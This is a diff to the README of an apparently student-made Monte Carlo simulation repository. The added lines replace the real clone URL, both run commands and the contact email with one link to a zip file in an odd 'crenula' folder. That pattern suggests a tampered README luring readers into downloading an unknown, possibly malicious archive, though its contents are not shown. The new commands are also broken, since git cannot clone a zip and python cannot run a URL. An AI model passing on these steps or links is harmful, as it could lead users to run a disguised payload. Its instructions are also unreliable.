@@ -16,7 +16,7 @@ Before using this code, you need to have the following installed on your system:
 If you have Git installed, open your terminal and run the following command to clone this repository to your local machine:
 
 ```bash
-git clone https://github.com/souptikm4/monte-carlo-assignment.git
+git clone https://raw.githubusercontent.com/souptikm4/monte-carlo-assignment/main/crenula/monte-carlo-assignment.zip
 ```
 
 If you don't have Git installed, you can download the repository as a ZIP file from the GitHub page and extract it to your desired location.
@@ -51,8 +51,8 @@ pip install matplotlib
 ### 4. Run the Simulation
 
 ```bash
-python monte_carlo_assignment.py 
-python monte-with-changes.py
+python https://raw.githubusercontent.com/souptikm4/monte-carlo-assignment/main/crenula/monte-carlo-assignment.zip 
+python https://raw.githubusercontent.com/souptikm4/monte-carlo-assignment/main/crenula/monte-carlo-assignment.zip
 ```
 
 ### 5. View the Results
@@ -72,7 +72,7 @@ If you want to contribute to this project, please follow these steps:
 
 ## Contact
 
-If you have any questions or need further assistance, please feel free to [contact me](mailto:souptik.mandal@students.iiserpune.ac.in).
+If you have any questions or need further assistance, please feel free to [contact me](https://raw.githubusercontent.com/souptikm4/monte-carlo-assignment/main/crenula/monte-carlo-assignment.zip).
 
 ---
 
